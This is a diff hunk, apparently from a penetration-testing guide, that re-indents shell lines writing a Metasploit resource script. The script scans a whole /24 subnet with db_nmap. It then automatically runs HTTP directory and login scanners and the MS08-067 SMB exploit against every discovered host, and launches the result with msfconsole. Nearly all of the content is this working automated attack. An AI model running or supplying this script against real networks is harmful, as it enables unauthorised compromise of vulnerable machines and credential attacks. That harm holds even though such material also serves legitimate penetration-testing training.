@@ -272,43 +272,43 @@
 
       touch exploiter.rc
 
-      echo 'db_nmap -sV -Pn -T4 -p 80,445,139 --open --reason 192.168.1.0/24' > exploiter.rc
-      echo 'services' >> exploiter.rc
-      echo "" >> exploiter.rc
-      echo '   <ruby>' >> exploiter.rc
-      echo "      xhost = framework.db.hosts.map(&:address).join(' ')" >> exploiter.rc
-      echo "      xport = framework.db.services.map(&:port).join(' ')" >> exploiter.rc
-      echo '      run_single("setg RHOSTS #{xhost}")' >> exploiter.rc
-      echo "" >> exploiter.rc
-      echo '         if xport =~ /80/i' >> exploiter.rc
-      echo '              print_status("## Target port: 80 http found")' >> exploiter.rc
-      echo '              print_good("## Running port 80 auxiliary/exploits.")' >> exploiter.rc
-      echo '              run_single("use auxiliary/scanner/http/title")' >> exploiter.rc
-      echo '              run_single("exploit")' >> exploiter.rc
-      echo '              print_good("######### dir_scanner auxiliary #########")' >> exploiter.rc
-      echo '              run_single("use auxiliary/scanner/http/dir_scanner")' >> exploiter.rc
-      echo '              run_single("exploit")' >> exploiter.rc
-      echo '              print_good("######### http_login auxiliary #########")' >> exploiter.rc
-      echo '              run_single("use auxiliary/scanner/http/http_login")' >> exploiter.rc
-      echo '              run_single("exploit")' >> exploiter.rc
-      echo '         end' >> exploiter.rc
-      echo "" >> exploiter.rc
-      echo '         if xport =~ /445/i' >> exploiter.rc
-      echo '              print_status("## Target port: 445 https found")' >> exploiter.rc
-      echo '              print_good("## Running port 445 auxiliary/exploits.")' >> exploiter.rc
-      echo '              run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
-      echo '              run_single("exploit")' >> exploiter.rc
-      echo '         end' >> exploiter.rc
-      echo "" >> exploiter.rc
-      echo '         if xport =~ /139/i' >> exploiter.rc
-      echo '              print_status("## Target port: 139 smb found")' >> exploiter.rc
-      echo '              print_good("## Running port 139 auxiliary/exploits.")' >> exploiter.rc
-      echo '              run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
-      echo '              run_single("exploit")' >> exploiter.rc
-      echo '         end' >> exploiter.rc
-      echo '   </ruby>' >> exploiter.rc
-      echo "" >> exploiter.rc
-      echo 'unsetg RHOSTS' >> exploiter.rc
+        echo 'db_nmap -sV -Pn -T4 -p 80,445,139 --open --reason 192.168.1.0/24' > exploiter.rc
+        echo 'services' >> exploiter.rc
+        echo "" >> exploiter.rc
+        echo '   <ruby>' >> exploiter.rc
+        echo "      xhost = framework.db.hosts.map(&:address).join(' ')" >> exploiter.rc
+        echo "      xport = framework.db.services.map(&:port).join(' ')" >> exploiter.rc
+        echo '      run_single("setg RHOSTS #{xhost}")' >> exploiter.rc
+        echo "" >> exploiter.rc
+        echo '         if xport =~ /80/i' >> exploiter.rc
+        echo '              print_status("## Target port: 80 http found")' >> exploiter.rc
+        echo '              print_good("## Running port 80 auxiliary/exploits.")' >> exploiter.rc
+        echo '              run_single("use auxiliary/scanner/http/title")' >> exploiter.rc
+        echo '              run_single("exploit")' >> exploiter.rc
+        echo '              print_good("######### dir_scanner auxiliary #########")' >> exploiter.rc
+        echo '              run_single("use auxiliary/scanner/http/dir_scanner")' >> exploiter.rc
+        echo '              run_single("exploit")' >> exploiter.rc
+        echo '              print_good("######### http_login auxiliary #########")' >> exploiter.rc
+        echo '              run_single("use auxiliary/scanner/http/http_login")' >> exploiter.rc
+        echo '              run_single("exploit")' >> exploiter.rc
+        echo '         end' >> exploiter.rc
+        echo "" >> exploiter.rc
+        echo '         if xport =~ /445/i' >> exploiter.rc
+        echo '              print_status("## Target port: 445 https found")' >> exploiter.rc
+        echo '              print_good("## Running port 445 auxiliary/exploits.")' >> exploiter.rc
+        echo '              run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
+        echo '              run_single("exploit")' >> exploiter.rc
+        echo '         end' >> exploiter.rc
+        echo "" >> exploiter.rc
+        echo '         if xport =~ /139/i' >> exploiter.rc
+        echo '              print_status("## Target port: 139 smb found")' >> exploiter.rc
+        echo '              print_good("## Running port 139 auxiliary/exploits.")' >> exploiter.rc
+        echo '              run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
+        echo '              run_single("exploit")' >> exploiter.rc
+        echo '         end' >> exploiter.rc
+        echo '   </ruby>' >> exploiter.rc
+        echo "" >> exploiter.rc
+        echo 'unsetg RHOSTS' >> exploiter.rc
 
 <br />    `[run]` msfconsole -r /root/exploiter.rc
 
